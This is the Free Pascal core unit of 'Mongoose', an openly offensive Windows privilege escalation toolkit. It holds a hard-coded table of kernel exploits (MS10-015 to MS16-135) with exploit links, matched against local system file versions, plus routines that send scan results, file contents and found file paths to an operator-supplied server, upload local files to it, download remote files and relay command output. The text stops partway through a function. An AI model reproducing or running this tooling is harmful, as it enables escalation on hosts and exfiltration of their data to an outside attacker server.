{



/'\_/`\
|     |   _     ___     __     _      _     ___    __
| (_) | /'_`\ /' _ `\ /'_ `\ /'_`\  /'_`\ /',__) /'__`\
| | | |( (_) )| ( ) |( (_) |( (_) )( (_) )\__, \(  ___/
(_) (_)`\___/'(_) (_)`\__  |`\___/'`\___/'(____/`\____)
                     ( )_) |
                      \___/'

 * Source is provided to this software because we believe users have a     *
 * right to know exactly what a program is going to do before they run it. *
 * This also allows you to audit the software for security holes.          *
 *                                                                         *
 * Source code also allows you to port Mongoose to new platforms, fix bugs *
 * and add new features.  You are highly encouraged to send your changes   *
 * to the security@secploit.com                                            *
 * Mongoose Toolkit will always be available Open Source.                  *
 *                                                                         *
 *                                                                         *
 *  This program is distributed in the hope that it will be useful,        *
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                   *
 *                                                                         *
 *  #Author : Lawrence Amer   @zux0x3a                                     *
 *  #LINKS : https://secploit.com , https://0xsp.com                       *
 *                                                                         *

#mongoose Core Unit windows privilege escalation toolkit



}
unit core;

{$mode objfpc}{$H+}

interface

uses
  Classes,SysUtils,process,windows,jwatlhelp32,lconvencoding,fpjson,jsonparser,blcksock,base64,FileUtil,httpsend,synautil,WinSock,FPHTTPClient;

function getwindowsv:string;
procedure Uploadfile(FileName: string;api:string);
function RandomString:String;
function sendcm(postdata:wideString):String;
function PostRequest(postdata:wideString;ip:string;sys:string;cat:string):String;
function getlocalip:string;
function FileVersion(const FileName: TFileName): String;
procedure Split (const Delimiter: Char; Input: string; const Strings: TStrings);
procedure exploitinspection;
FUNCTION WritableDir(CONST Dir : STRING) : BOOLEAN;
function downloadfile(url:string;filename:string):string;
function findastring(PathName,FileName:string;Texttofind:string;InDir:boolean):string;
procedure GetDriveLetters(AList: TStrings);
function SystemFolder: string;
function catfile(filename:string;filepath:ansistring):string;
function osver: string;
function powerit(command:string;res:string):string;
function runit(command:string):string;
function loadingplugin(cmd:string;arg:string):string;
function powershell(command:String):string;

const
  BUF_SIZE = 2048;
  DEF_PORT = ':4000';  // default port of node js application api

  const
  BUILD_FREE_VAL = word($F000);

  BUILD_FREE_STR = 'Free build';
  BUILD_CHKD_STR = 'Checked build';

  BuildString    : pchar = BUILD_FREE_STR;

var
  MajorVersion   : DWORD;
  MinorVersion   : DWORD;
  BuildNumberRec : packed record
                     BuildNumber : word;
                     Build       : word;
                   end;
  Build          : DWORD absolute BuildNumberRec;




procedure RtlGetNtVersionNumbers(out MajorVersion : DWORD;
                                out MinorVersion : DWORD;
                                out Build        : DWORD);
         stdcall; external 'ntdll.dll';

implementation




function RandomString:String;
var
ip,os,res,d:String;

begin
{ this will generate unique key for scan results for hosts .  }
  ip:=getlocalip;
  os:=osver;
  d :=  datetimetostr(date);
  res := ip+os+d;
  result :=EncodeStringBase64(res);
end;
function sendcm(postdata:wideString):String;
var
  FPHTTPClient: TFPHTTPClient;
  ResultPost, payload,header: String;
  pass,host,uid:string;
  i:integer;
  rep:boolean;
Begin

  rep := false;
  uid := randomstring;
  for i := 1 to paramcount do begin

      if(paramstr(i)='-srvhost') then begin
          writeln('<*> commnands sent : ',paramstr(i+1));
          host :=paramstr(i+1);
          rep := true;
      end;
     if (paramstr(i)='-x') then begin

          pass := paramstr(i+1);

     end;

   end;
payload := 'username=admin&password='+pass+'&command_output='+postdata;

if (rep = true) then begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
FPHTTPClient.AddHeader('key','test');
//HTTP.AddHeader('User-Agent','Mozilla/5.0 (compatible; fpweb)');
   try
      ResultPost := FPHTTPClient.formpost('http://'+host+DEF_PORT+'/api/cmd_commands', payload); // test URL, real one is HTTPS
      sendcm := ResultPost;
      writeln(sendcm);
   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;
end;
  end;
function PostRequest(postdata:wideString;ip:string;sys:string;cat:string):String;
var
  FPHTTPClient: TFPHTTPClient;
  ResultPost, payload,header: String;
  pass,host,uid:string;
  i:integer;
  rep:boolean;
Begin

  rep := false;
  uid := randomstring;
  for i := 1 to paramcount do begin

      if(paramstr(i)='-o') then begin
          writeln('<*> Results has been sent : ',paramstr(i+1));
          host :=paramstr(i+1);
          rep := true;
      end;
     if (paramstr(i)='-x') then begin

          pass := paramstr(i+1);

     end;

   end;
payload := 'username=admin&password='+pass+'&output='+'<pre>'+postdata+'</pre>'+'&category='+cat+'&host='+ip+'&sys='+sys+'&random_string='+uid;

if (rep = true) then begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
FPHTTPClient.AddHeader('key','test');
//HTTP.AddHeader('User-Agent','Mozilla/5.0 (compatible; fpweb)');
   try
      ResultPost := FPHTTPClient.formpost('http://'+host+DEF_PORT+'/api/Postreq', payload); // test URL, real one is HTTPS
      PostRequest := ResultPost;
      writeln(postrequest);
   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;
end;
  end;
function getlocalip:string;
type
  TaPInAddr = array [0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe : PHostEnt;
  pptr : PaPInAddr;
  buffer : array [0..63] of char;
  i : integer;
  GInitData : TWSADATA;
begin
  WSAStartup($101, GInitData);
  Result:='';
  GetHostName(buffer, sizeof(buffer));
  phe:=gethostbyname(buffer);
  if phe = nil then
  begin
    Exit;
  end;
  pptr:= PaPInAddr(phe^.h_addr_list);
  i:=0;
  while not (pptr^[i] = nil) do
  begin
    result:=StrPas(inet_ntoa(pptr^[i]^));
    Inc(i);
  end;
  WSACleanup;
end;



function HttpPostFile_multi(const URL, InputText1FieldName, InputText1, InputText2FieldName, InputText2, InputFileFieldName, InputFileName: string; InputFileData: TStream; ResultData: TStrings): Boolean;
var
  HTTP: THTTPSend;
  Bound: string;
  i :integer;
  auth:string;
begin
  Bound := IntToHex(Random(MaxInt), 8) + '_Synapse_boundary';
  HTTP := THTTPSend.Create;
  try
    WriteStrToStream(HTTP.Document,
      '--' + Bound + CRLF +
      'Content-Disposition: form-data; name=' + AnsiQuotedStr(InputText1FieldName, '"') + CRLF +
      'Content-Type: text/plain' + CRLF +
      CRLF);
    WriteStrToStream(HTTP.Document, InputText1);
    WriteStrToStream(HTTP.Document,
      CRLF +
      '--' + Bound + CRLF +
      'Content-Disposition: form-data; name=' + AnsiQuotedStr(InputText2FieldName, '"') + CRLF +
//     'Content-Type: text/plain' + CRLF +
      CRLF);
    WriteStrToStream(HTTP.Document, 'admin');
    WriteStrToStream(HTTP.Document,
      CRLF +
      '--' + Bound + CRLF +
        'Content-Disposition: form-data; name=' + AnsiQuotedStr('password', '"') + CRLF +
//     'Content-Type: text/plain' + CRLF +
      CRLF);
    for i := 0 to paramcount do begin

    if (paramstr(i)='-t') then begin
      auth := paramstr(i+3);                       //this will grab password string from pos 3 after -t
      end;
    end;

    WriteStrToStream(HTTP.Document,auth);
    WriteStrToStream(HTTP.Document,
      CRLF +
      '--' + Bound + CRLF +
      'Content-Disposition: form-data; name=' + AnsiQuotedStr(InputFileFieldName, '"') + ';' + CRLF +
      #9'filename=' + AnsiQuotedStr(InputFileName, '"') + CRLF +
      'Content-Type: application/octet-string' + CRLF +
      CRLF);
    HTTP.Document.CopyFrom(InputFileData, 0);
    WriteStrToStream(HTTP.Document,
      CRLF +
      '--' + Bound + '--' + CRLF);
    HTTP.MimeType := 'multipart/form-data; boundary=' + Bound;
    Result := HTTP.HTTPMethod('POST', URL);
    if Result then
      ResultData.LoadFromStream(HTTP.Document);
  finally
    HTTP.Free;
  end;
end;
procedure Uploadfile(FileName: string;api:string);
var
DATA: TFileStream;
URL : string;
rs : Tstringlist;
postres:boolean;

begin

if not FileExists(Filename) then exit;
Data := TFileStream.Create(filename,fmopenread or fmsharedenywrite);
rs := tstringlist.Create;
try
   url := api+DEF_PORT+'/upload/uploadFile';        //API IP , Default Path of End-Point
   HttpPostFile_multi(URL,'','','username','','file',FileName,DATA,rs);
   writeln(rs.Text);
finally
data.free;
rs.free;
end;

end;

function FileVersion(const FileName: TFileName): String;
var
 VerInfoSize: Cardinal;
 VerValueSize: Cardinal;
 Dummy: Cardinal;
 PVerInfo: Pointer;
 PVerValue: PVSFixedFileInfo;
begin
 Result := '';
 VerInfoSize := GetFileVersionInfoSize(PChar(FileName), Dummy);
 GetMem(PVerInfo, VerInfoSize);
 try
   if GetFileVersionInfo(PChar(FileName), 0, VerInfoSize, PVerInfo) then
     if VerQueryValue(PVerInfo, '\', Pointer(PVerValue), VerValueSize) then
       with PVerValue^ do
         Result := Format('%d.%d.%d.%d', [
           HiWord(dwProductVersionMS), //Major
           LoWord(dwProductVersionMS), //Minor
           HiWord(dwFileVersionLS), //Release
           LoWord(dwFileVersionLS)]); //Build
 finally
   FreeMem(PVerInfo, VerInfoSize);
 end;
end;

procedure Split (const Delimiter: Char; Input: string; const Strings: TStrings);
begin
   Assert(Assigned(Strings)) ;
   Strings.Clear;
   Strings.StrictDelimiter := true;
   Strings.Delimiter := Delimiter;
   Strings.DelimitedText := Input;
end;
procedure exploitinspection;
var
  jData : TJSONData;
  jObject : TJSONObject;
  jArray : TJSONArray;
  link : String;
  ss :string;
  max:string;
  build,revsion,s,LE,GE:string;
  i,o:integer;
  res,ref,bld,rev:string;
  j,ip,os,vr,UQ:string;
  SubObj:TJSONObject;
  list: Tstringlist;
   operation : boolean;

  begin
  ip := getlocalip;
  os := osver;
   list := Tstringlist.Create;
   j:=
      '{'+
      '    "database" : ['+
      '        {'+
      '            "val1" : "User Mode to Ring (KiTrap0D) MS10-015",'+
      '            "val2" : "ntoskrnl.exe",'+
      '            "val3" : "https://www.exploit-db.com/exploits/11199/",'+
      '            "val4" : "20591",'+  //revison version
      '            "bld5" : "7600",'+ //build version
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "Task Scheduler .XML MS10-092",'+
      '            "val2" : "schedsvc.dll",'+
      '            "val3" : "https://www.exploit-db.com/exploits/19930/",'+
      '            "val4" : "20830",'+
      '            "bld5" : "7600",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "NTUserMessageCall Win32k Kernel Pool Overflow MS13-053",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/33213/",'+
      '            "val4" : "17000",'+  //should be greater than
      '            "bld5" : "7600",'+
      '            "uq" : "GE"'+
      '        },'+
      '        {'+
      '            "val1" : "NTUserMessageCall Win32k Kernel Pool Overflow MS13-053",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/33213/",'+
      '            "val4" : "22348",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "NTUserMessageCall Win32k Kernel Pool Overflow MS13-053",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/33213/",'+
      '            "val4" : "20732",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "TrackPopupMenuEx Win32k NULL Page MS13-081",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/31576/",'+
      '            "val4" : "18000",'+
      '            "bld5" : "7600",'+
      '            "uq" : "GE"'+
      '        },'+
      '        {'+
      '            "val1" : "TrackPopupMenuEx Win32k NULL Page MS13-081",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/31576/",'+
      '            "val4" : "22435",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "TrackPopupMenuEx Win32k NULL Page MS13-081",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/31576/",'+
      '            "val4" : "20807",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "TrackPopupMenu Win32k Null Pointer Dereference MS14-058",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/35101/",'+
      '            "val4" : "18000",'+
      '            "bld5" : "7600",'+
      '            "uq" : "GE"'+
      '        },'+
          '        {'+
      '            "val1" : "TrackPopupMenu Win32k Null Pointer Dereference MS14-058",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/35101/",'+
      '            "val4" : "22823",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "TrackPopupMenu Win32k Null Pointer Dereference MS14-058",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/35101/",'+
      '            "val4" : "21247",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "TrackPopupMenu Win32k Null Pointer Dereference MS14-058",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/35101/",'+
      '            "val4" : "17353",'+
      '            "bld5" : "9600",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "ClientCopyImage Win32k MS15-051",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/37367/",'+
      '            "val4" : "18000",'+
      '            "bld5" : "7600",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "ClientCopyImage Win32k MS15-051",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/37367/",'+
      '            "val4" : "22823",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "ClientCopyImage Win32k MS15-051",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/37367/",'+
      '            "val4" : "21247",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "ClientCopyImage Win32k MS15-051",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/37367/",'+
      '            "val4" : "17353",'+
      '            "bld5" : "9600",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "Microsoft Font Driver MS15078",'+
      '            "val2" : "atmfd.dll",'+
      '            "val3" : "https://www.exploit-db.com/exploits/38222",'+
      '            "val4" : "243",'+
      '            "bld5" : "243",'+
      '            "uq" : "GE"'+
      '        },'+
      '        {'+
      '            "val1" : "mrxdav.sys WebDAV MS16-016",'+
      '            "val2" : "drivers/mrxdav.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/40085/",'+
      '            "val4" : "16000",'+
      '            "bld5" : "7600",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "mrxdav.sys WebDAV MS16-016",'+
      '            "val2" : "drivers/mrxdav.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/40085/",'+
      '            "val4" : "23317",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "mrxdav.sys WebDAV MS16-016",'+
      '            "val2" : "drivers/mrxdav.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/40085/",'+
      '            "val4" : "21738",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "mrxdav.sys WebDAV MS16-016",'+
      '            "val2" : "drivers/mrxdav.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/40085/",'+
      '            "val4" : "18189",'+
      '            "bld5" : "9600",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "mrxdav.sys WebDAV MS16-016",'+
      '            "val2" : "drivers/mrxdav.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/40085/",'+
      '            "val4" : "16683",'+
      '            "bld5" : "10240",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "mrxdav.sys WebDAV MS16-016",'+
      '            "val2" : "drivers/mrxdav.sys",'+
      '            "val3" : "https://www.exploit-db.com/exploits/40085/",'+
      '            "val4" : "103",'+
      '            "bld5" : "10586",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "23909",'+
      '            "bld5" : "6002",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "19598",'+
      '            "bld5" : "6002",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "23000",'+
      '            "bld5" : "6002",'+
      '            "uq" : "GE"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "19148",'+
      '            "bld5" : "7600",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "19148",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "23000",'+
      '            "bld5" : "7601",'+
      '            "uq" : "GE"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "23347",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "17649",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "21000",'+
      '            "bld5" : "9200",'+
      '            "uq" : "GE"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "21767",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "18230",'+
      '            "bld5" : "9600",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "16724",'+
      '            "bld5" : "10240",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "secondary_logon_handle_privesc MS16-032",'+
      '            "val2" : "seclogon.dll",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032",'+
      '            "val4" : "161",'+
      '            "bld5" : "10586",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "Windows Kernel-Mode Drivers EoP MS16-034",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034",'+
      '            "val4" : "19597",'+
      '            "bld5" : "6002",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "Windows Kernel-Mode Drivers EoP MS16-034",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034",'+
      '            "val4" : "23908",'+
      '            "bld5" : "6002",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "Windows Kernel-Mode Drivers EoP MS16-034",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034",'+
      '            "val4" : "19145",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "Windows Kernel-Mode Drivers EoP MS16-034",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034",'+
      '            "val4" : "23346",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "Windows Kernel-Mode Drivers EoP MS16-034",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034",'+
      '            "val4" : "17647",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "Windows Kernel-Mode Drivers EoP MS16-034",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034",'+
      '            "val4" : "21766",'+
      '            "bld5" : "9200",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "Windows Kernel-Mode Drivers EoP MS16-034",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034",'+
      '            "val4" : "18228",'+
      '            "bld5" : "9600",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "Win32k Elevation of Privilege MS16-135",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135",'+
      '            "val4" : "23584",'+
      '            "bld5" : "7601",'+
      '            "uq" : "LT"'+
      '        },'+
      '        {'+
      '            "val1" : "Win32k Elevation of Privilege MS16-135",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135",'+
      '            "val4" : "18524",'+
      '            "bld5" : "9600",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "Win32k Elevation of Privilege MS16-135",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135",'+
      '            "val4" : "16384",'+
      '            "bld5" : "10240",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "Win32k Elevation of Privilege MS16-135",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135",'+
      '            "val4" : "19",'+
      '            "bld5" : "10586",'+
      '            "uq" : "LE"'+
      '        },'+
      '        {'+
      '            "val1" : "Win32k Elevation of Privilege MS16-135",'+
      '            "val2" : "win32k.sys",'+
      '            "val3" : "https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135",'+
      '            "val4" : "446",'+
      '            "bld5" : "14393",'+
      '            "uq" : "LE"'+
      '        }'+
      '    ]'+
      '} ';

   jData := GetJSON(j);
   //  ip := getsysip;
  // os := sysname;
  s := jData.AsJSON;
  s := jData.FormatJSON;
  jObject := TJSONObject(jData);
  jArray := jObject.Arrays['database'];
  for i := 0 to jArray.Count - 1 do
  begin
    SubObj := jArray.Objects[i];
    link := jArray.Objects[i].FindPath('val3').AsString;
    max := jArray.Objects[i].FindPath('val4').AsString;
    res := jArray.Objects[i].FindPath('val1').AsString;
    ref := JArray.Objects[i].FindPath('val2').AsString;
    bld :=Jarray.Objects[i].FindPath('bld5').AsString;
    UQ := Jarray.Objects[i].FindPath('uq').AsString;
      //end;

    //check if file is exsited or not before getting version , to handle out of bounds raise errors
       if FileExists(systemfolder+'\'+ref) then begin
    //this function for getting the version of file
     vr :=fileversion(systemfolder+'\'+ref);
     split('.',vr,list);
     build := list.ValueFromIndex[2];
     revsion := list.ValueFromIndex[3];  //revsion
     //build


     if UQ ='LE' then begin
       operation := revsion <= max ;
     end else if UQ='GE' then begin       //define operation by <= OR >= to avoid any mistakes
       operation := revsion >= max;
     end else if UQ='LT' then begin
     operation := revsion < max;
     end;

    if (bld = build) AND (operation) then begin

      writeln('[!] Appears to be  vulnerable  '+res +' ([+] '+link+')');
  postrequest('<font color="red"><b>[!] Appears to be  vulnerable  '+res +'</b></font> ( <font color="lightgreen"><b>[**] '+link+'</b></font> )',ip,os,'12');   //this will send information into API

    end;

  end;
  //list.Free;
  end;
  end;


FUNCTION WritableDir(CONST Dir : STRING) : BOOLEAN;
  VAR
    FIL : FILE;
    N   : STRING;
    I   : Cardinal;

  BEGIN
    REPEAT
      N:=IncludeTrailingPathDelimiter(Dir);
      FOR I:=1 TO 250-LENGTH(N) DO N:=N+CHAR(RANDOM(26)+65)
    UNTIL NOT FileExists(N);
    Result:=TRUE;
    TRY
      AssignFile(FIL,N);
      REWRITE(FIL,1);
      Result:=FileExists(N); // Not sure if this is needed, but AlainD says so :-)
    EXCEPT
      Result:=FALSE
    END;
    IF Result THEN BEGIN
      CloseFile(FIL);
      ERASE(FIL)
    END
  END;


function downloadfile(url:string;filename:string):string;
var
  Client: TFPHttpClient;
  FS: TStream;
  SL: TStringList;
begin
  { SSL initialization has to be done by hand here }
  //InitSSLInterface;
  Client := TFPHttpClient.Create(nil);
  FS := TFileStream.Create(Filename,fmCreate or fmOpenWrite);
  try
    try
      { Allow redirections }
     // Client.AllowRedirect := true;
      writeln('============================================');
      writeln('[+] Trying Downloading File into ',filename);
      Client.Get(url,FS);

    except
      on E: EHttpClient do
        writeln(E.Message)
      else
        raise;
    end;
  finally
    writeln('[+] Download operation has been completed');
    writeln('=============================================');
    FS.Free;
    Client.Free;
  end;
  end;


function findastring(PathName,FileName:string;Texttofind:string;InDir:boolean):string;
 var
    Rec  : TSearchRec;
    Path ,s ,ip,os: string;
    FileContents: TStringlist;
    re,i:integer;
    stream: TMemorystream;
begin
ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os
Path := IncludeTrailingBackslash(PathName);
FileContents := TStringList.Create;
//stream := TMemoryStream.Create;

if FindFirst(Path + FileName, faAnyFile - faDirectory, Rec) = 0 then
 Try
   Try
    repeat
    FileContents.LoadFromFile(Path + Rec.Name); //Load contents of file
    //SetLength(s, stream.Size);
   // stream.ReadBuffer(s[1], stream.Size);
   s := Filecontents.Text;
    Filecontents.Text:=ConvertEncoding(s,GuessEncoding(s), EncodingUTF8);
    //writeln(Filecontents.Text);
    re := pos(Texttofind, FileContents.Text);
    if re <> 0 then //Look inside file for string
    writeln(Path + Rec.Name);
    postRequest(Path + Rec.Name,ip,os,'16');    //this will handle sending information into web API
    until FindNext(Rec) <> 0;
   Except  //Error Handling
     on E: EStreamError do
     begin
     writeln('Error: ' + E.Message);
     end;
   end;
 finally
   SysUtils.FindClose(Rec);
  // stream.free;
 end;

If not InDir then Exit;

if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
 try
   repeat
    if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name<>'.') and (Rec.Name<>'..') then
     findastring(Path + Rec.Name,FileName,Texttofind, True);
   until FindNext(Rec) <> 0;
 finally
   SysUtils.FindClose(Rec);
 end;

end;

procedure GetDriveLetters(AList: TStrings);
var
  vDrivesSize: Cardinal;
  vDrives	: array[0..128] of Char;
  vDrive	 : PChar;
begin
  AList.BeginUpdate;
  try
	// clear the list from possible leftover from prior operations
	AList.Clear;
	vDrivesSize := GetLogicalDriveStrings(SizeOf(vDrives), vDrives);
	if vDrivesSize=0 then Exit; // no drive found, no further processing needed

	vDrive := vDrives;
	while vDrive^ <> #0 do
	begin
	  AList.Add(StrPas(vDrive));
	  Inc(vDrive, SizeOf(vDrive));
	end;
  finally
	AList.EndUpdate;
  end;
end;
function SystemFolder: string;
begin
  SetLength(Result, Windows.MAX_PATH);
  SetLength(
    Result, Windows.GetSystemDirectory(PChar(Result), Windows.MAX_PATH)
  );
end;
function catfile(filename:string;filepath:ansistring):string;
var
  tf:textfile;
  s,os,ip:string;
begin
ip :=getlocalip;     //retrieve host ip address for all unix system
os := osver;     //retrieve operating system  os
assignfile(tf,filepath+filename);
try
reset(tf);
while not eof(tf) do
    begin
       readln(tf,s);
      writeln(s);
   postRequest('[*] Reading Host File '+s,ip,os,'14');
    end;
CloseFile(tf);
except
   on E: EInOutError do
    writeln('File handling error occurred. Details: ', E.Message);
 end;
end;


function getwindowsv:string;

begin
